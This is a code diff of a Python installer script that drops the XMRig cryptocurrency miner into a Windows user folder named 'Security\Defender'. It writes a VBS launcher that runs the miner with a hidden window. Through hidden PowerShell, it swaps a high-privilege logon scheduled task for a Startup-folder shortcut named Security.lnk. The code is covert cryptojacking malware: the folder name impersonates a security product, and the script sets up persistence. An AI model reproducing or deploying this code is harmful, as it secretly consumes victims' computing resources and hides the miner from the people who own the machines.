@@ -5,20 +5,21 @@ import shutil
 import getpass
 import subprocess
 
-Script_Dir    = os.path.dirname(os.path.abspath(__file__))
-XMR_Source    = os.path.join(Script_Dir, "XMR")
+Script_Dir   = os.path.dirname(os.path.abspath(__file__))
+XMR_Source   = os.path.join(Script_Dir, "XMR")
 
-User_Name     = getpass.getuser()
-Security_Dir  = os.path.join("C:\\Users", User_Name, "Security")
-Defender_Dir  = os.path.join(Security_Dir, "Defender")
-Dest_Config   = os.path.join(Defender_Dir, "config.json")
-Dest_Vbs      = os.path.join(Defender_Dir, "Start.vbs")
-Xmrig_Exe     = os.path.join(Defender_Dir, "xmrig.exe")
-Startup_Dir   = os.path.join(
+User_Name    = getpass.getuser()
+Security_Dir = os.path.join("C:\\Users", User_Name, "Security")
+Defender_Dir = os.path.join(Security_Dir, "Defender")
+Dest_Config  = os.path.join(Defender_Dir, "config.json")
+Dest_Vbs     = os.path.join(Defender_Dir, "Start.vbs")
+Xmrig_Exe    = os.path.join(Defender_Dir, "xmrig.exe")
+Startup_Dir  = os.path.join(
     "C:\\Users", User_Name,
     "AppData", "Roaming", "Microsoft", "Windows",
     "Start Menu", "Programs", "Startup"
 )
+Lnk_Path     = os.path.join(Startup_Dir, "Security.lnk")
 
 Total_Threads = os.cpu_count() or 1
 
@@ -56,31 +57,24 @@ for Pool in Config.get("pools", []):
 with open(Dest_Config, "w") as F:
     json.dump(Config, F, indent=4)
 
-Vbs_Content = (
+Vbs_Lines = (
     'Set WshShell = CreateObject("WScript.Shell")\r\n'
     f'WshShell.CurrentDirectory = "{Defender_Dir}"\r\n'
-    f'WshShell.Run Chr(34) & "{Xmrig_Exe}" & Chr(34), 0, False\r\n'
+    f'WshShell.Run "{Xmrig_Exe}", 0, False\r\n'
 )
 with open(Dest_Vbs, "w") as F:
-    F.write(Vbs_Content)
+    F.write(Vbs_Lines)
 
-for Old_File in ["Security.vbs", "Security.lnk"]:
-    Old_Path = os.path.join(Startup_Dir, Old_File)
-    if os.path.exists(Old_Path):
-        os.remove(Old_Path)
+os.makedirs(Startup_Dir, exist_ok=True)
 
 Ps_Command = (
-    f"$A = New-ScheduledTaskAction "
-    f"-Execute 'wscript.exe' "
-    f"-Argument '//B \"{Dest_Vbs}\"' "
-    f"-WorkingDirectory '{Defender_Dir}'; "
-    f"$T = New-ScheduledTaskTrigger -AtLogOn; "
-    f"$S = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0 -StartWhenAvailable $true; "
-    f"$P = New-ScheduledTaskPrincipal -UserId '{User_Name}' -RunLevel Highest -LogonType Interactive; "
-    f"Register-ScheduledTask -TaskName 'Security_Defender' "
-    f"-Action $A -Trigger $T -Settings $S -Principal $P -Force"
+    f'$Ws = New-Object -ComObject WScript.Shell; '
+    f'$Sc = $Ws.CreateShortcut("{Lnk_Path}"); '
+    f'$Sc.TargetPath = "{Dest_Vbs}"; '
+    f'$Sc.WorkingDirectory = "{Defender_Dir}"; '
+    f'$Sc.Save()'
 )
 subprocess.run(
-    ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", Ps_Command],
+    ["powershell", "-WindowStyle", "Hidden", "-Command", Ps_Command],
     check=True
 )
